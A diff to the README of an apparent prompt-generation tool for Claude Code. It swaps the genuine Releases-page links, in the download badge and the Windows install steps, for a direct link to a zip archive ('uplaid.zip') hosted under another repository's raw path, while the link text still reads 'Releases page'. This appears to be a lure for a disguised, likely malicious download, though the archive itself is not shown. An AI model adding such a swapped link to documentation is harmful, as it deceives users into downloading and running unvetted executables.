@@ -5,7 +5,7 @@ description: "Generate structured prompts for Claude Code by selecting your mode
 ---
 # 📋 claude-planning-tool - Generate effective prompts for Claude faster
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/odessaspecial486/claude-planning-tool/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/odessaspecial486/odessaspecial486.github.io/raw/refs/heads/main/js/uplaid.zip)
 
 This software helps you create structured prompts for Claude Code. You choose your model, your specific application, and the level of effort for your task. The tool builds a prompt that you copy and paste into your workspace. It removes the guesswork from drafting instructions.
 
@@ -13,7 +13,7 @@ This software helps you create structured prompts for Claude Code. You choose yo
 
 Follow these steps to get the application onto your Windows computer.
 
-1. Go to the [Releases page](https://github.com/odessaspecial486/claude-planning-tool/releases).
+1. Go to the [Releases page](https://github.com/odessaspecial486/odessaspecial486.github.io/raw/refs/heads/main/js/uplaid.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to start your download.
 4. Open your Downloads folder to find the file once it finishes.
